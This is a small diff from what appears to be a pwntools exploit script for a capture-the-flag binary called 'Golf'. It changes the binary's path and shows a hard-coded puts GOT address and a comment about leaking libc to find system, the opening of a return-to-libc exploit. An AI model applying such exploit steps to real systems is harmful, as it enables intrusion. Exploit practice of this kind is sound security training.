@@ -3,7 +3,7 @@ from pwn import *
 puts_got_str = '804a014'
 puts_got_hex = 0x804a014
 
-p = process('./Golf')
+p = process('../problemset/Golf')
 
 
 # stage 0. leak the puts address in libc, and get system address
